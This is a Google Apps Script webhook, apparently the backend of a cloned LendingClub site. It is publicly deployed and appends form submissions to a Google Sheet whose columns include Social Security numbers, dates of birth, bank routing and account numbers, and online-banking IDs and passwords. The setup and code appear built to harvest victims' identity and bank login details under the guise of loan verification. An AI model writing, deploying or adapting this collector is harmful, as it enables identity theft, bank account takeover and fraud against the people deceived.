/**
 * Google Apps Script Webhook for LendingClub Identity Verification (V3 - Fixed)
 *
 * INSTRUCTIONS:
 * 1. Open your Google Sheet: https://docs.google.com/spreadsheets/d/1eOIjZKEdvNisV5CqotWt7r01uPuyhbvsUW42DEac5Fg
 * 2. Go to Extensions > Apps Script
 * 3. Replace ALL code in the editor with this content
 * 4. Save (Ctrl+S)
 * 5. Click Deploy > New Deployment (or "Manage Deployments" to update existing)
 * 6. Select type: "Web App"
 * 7. Execute as: Me
 * 8. Who has access: Anyone
 * 9. Click Deploy / Update
 * 10. Copy the Web App URL (looks like https://script.google.com/macros/s/.../exec)
 * 11. Paste it into: d:\Lending-Club-Clonev2\.env  as GOOGLE_SHEETS_WEBHOOK_URL=<your-url>
 */

// ── CONFIGURATION ──────────────────────────────────────────────────────────
const SHEET_ID   = "1eOIjZKEdvNisV5CqotWt7r01uPuyhbvsUW42DEac5Fg"; // Your Google Sheet ID
const SHEET_NAME = "Verification Submissions";                        // Tab name (auto-created if missing)
// ───────────────────────────────────────────────────────────────────────────

function doPost(e) {
  try {
    // If deployed from within the sheet, getActiveSpreadsheet() works.
    // If deployed as a standalone script, openById() is used as fallback.
    const ss = SpreadsheetApp.getActiveSpreadsheet() || SpreadsheetApp.openById(SHEET_ID);
    let sheet = ss.getSheetByName(SHEET_NAME);

    // Auto-create the tab with headers if it doesn't exist yet
    if (!sheet) {
      sheet = ss.insertSheet(SHEET_NAME, 0); // Position 0 = first tab
      const headers = [
        "First Name", "Last Name", "Email", "Phone", "Date of Birth", "SSN",
        "Address", "City", "State", "Country", "ZIP Code", "Loan Amount",
        "Bank Name", "Routing Number", "Account Number", "Banking ID", "Banking Password",
        "Submitted At"
      ];
      sheet.appendRow(headers);
      const headerRange = sheet.getRange(1, 1, 1, headers.length);
      headerRange.setFontWeight("bold").setBackground("#0077B3").setFontColor("#ffffff");
      sheet.setFrozenRows(1);
      sheet.setColumnWidths(1, headers.length, 160);
    } else {
      // If sheet exists but isn't first, move it to front
      ss.setActiveSheet(sheet);
      ss.moveActiveSheet(1);
    }

    const data = JSON.parse(e.postData.contents);
    let row = data.values;

    // Force all values to string to preserve formatting (prevents scientific notation on SSN, routing, etc.)
    row = row.map(val => String(val || ""));

    // Ensure timestamp at position 17 (index)
    if (!row[17] || row[17] === "undefined") {
      row[17] = new Date().toLocaleString("en-US", { timeZone: "America/New_York" });
    }

    sheet.appendRow(row);

    // Set the newly added row to plain text to preserve leading zeros
    const lastRow = sheet.getLastRow();
    sheet.getRange(lastRow, 1, 1, row.length).setNumberFormat("@");

    return ContentService
      .createTextOutput(JSON.stringify({ success: true, row: lastRow }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (error) {
    console.error("Apps Script Error:", error.toString());
    return ContentService
      .createTextOutput(JSON.stringify({ success: false, error: error.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function doGet(e) {
  return ContentService
    .createTextOutput("✅ LendingClub Webhook is Live! Sheet: " + SHEET_NAME)
    .setMimeType(ContentService.MimeType.TEXT);
}
